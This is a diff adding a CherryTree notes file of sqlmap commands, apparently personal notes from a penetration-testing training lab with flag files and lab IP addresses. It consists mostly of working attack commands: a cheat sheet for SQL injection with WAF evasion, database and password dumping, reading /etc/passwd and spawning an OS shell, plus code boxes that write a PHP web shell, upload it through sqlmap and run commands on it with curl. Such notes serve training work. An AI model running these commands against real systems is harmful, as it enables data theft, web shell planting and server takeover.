@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="79" master_id="0" name="Simple Commands" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1767012040" ts_lastsave="1767293821">
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+Depending if its JSON or Get we can legit just add to the query paramter f.e. *
+
+Increase --level and --risk for more success. 
+
+&#13;&#13;sqlmap -r requests.txt --level 5 --risk 3 --dump --random-agent --skip-waf  --tamper=between,randomcase
+
+
+Upload basic http shelL and execute command
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+</rich_text>
+    <table char_offset="0" justification="left" col_min="60" col_max="60" col_widths="0,0">
+      <row>
+        <cell>sqlmap -h 
+sqlmap -hh	View the advanced help menu
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch	Run SQLMap without asking for user input
+sqlmap 'http://www.example.com/' --data 'uid=1&amp;name=test'	SQLMap with POST request
+sqlmap 'http://www.example.com/' --data 'uid=1*&amp;name=test'	POST request specifying an injection point with an asterisk
+sqlmap -r req.txt	Passing an HTTP request file to SQLMap
+sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'	Specifying a cookie header
+sqlmap -u www.target.com --data='id=1' --method PUT	Specifying a PUT request
+sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt	Store traffic to an output file
+sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch	Specify verbosity level
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"	Specifying a prefix or suffix
+sqlmap -u www.example.com/?id=1 -v 3 --level=5	Specifying the level and risk
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba	Basic DB enumeration
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb	Table enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname	Table/row enumeration
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"	Conditional enumeration
+sqlmap -u "http://www.example.com/?id=1" --schema	Database schema enumeration
+sqlmap -u "http://www.example.com/?id=1" --search -T user	Searching for data
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch	Password enumeration and cracking
+sqlmap -u "http://www.example.com/" --data="id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"	Anti-CSRF token bypass
+sqlmap --list-tampers	List all tamper scripts
+sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba	Check for DBA privileges
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"	Reading a local file
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"	Writing a file
+sqlmap -u "http://www.example.com/?id=1" --os-shell	Spawning an OS shell
+
+--dumb TO DUMP ALL DATA</cell>
+        <cell>View the Basic help menu
+View the advanced help menu
+Run SQLMap without asking for user input
+SQLMap with POST request
+POST request specifying an injection point with an asterisk
+Passing an HTTP request file to SQLMap
+Specifying a cookie header
+PUT	Specifying a PUT request
+Store traffic to an output file
+Specify verbosity level
+Specifying a prefix or suffix
+Specifying the level and risk
+Basic DB enumeration
+Tale enumeration
+Table/row enumeration
+Conditional enumeration
+Database schema enumeration
+Searching for data
+Password enumeration and cracking
+Anti-CSRF token bypass
+List all tamper scripts
+Check for DBA privileges
+Reading a local file
+Writing a file
+Spawning an OS shell
+	</cell>
+      </row>
+    </table>
+    <codebox char_offset="3" justification="left" frame_width="555" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">sqlmap -r request.txt --batch --dump
+sqlmap "http://94.237.55.124:45986/case3.php" --cookie="id=1*" --dump&#13;
+</codebox>
+    <codebox char_offset="286" justification="left" frame_width="985" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+sqlmap -r requests.txt --level 5 --risk 3 --dump --random-agent --skip-waf --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+curl http://94.237.52.235:39121/shell.php?cmd=cat%20flag.txt</codebox>
+    <codebox char_offset="288" justification="left" frame_width="3408" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">sqlmap 'http://94.237.61.82:57625/action.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Origin: http://94.237.61.82:57625' -H 'Connection: keep-alive' -H 'Referer: http://94.237.61.82:57625/shop.html' -H 'Priority: u=0' --data-raw '{"id":1}' --tamper=between --dump -T "final_flag"</codebox>
+  </node>
+</cherrytree>
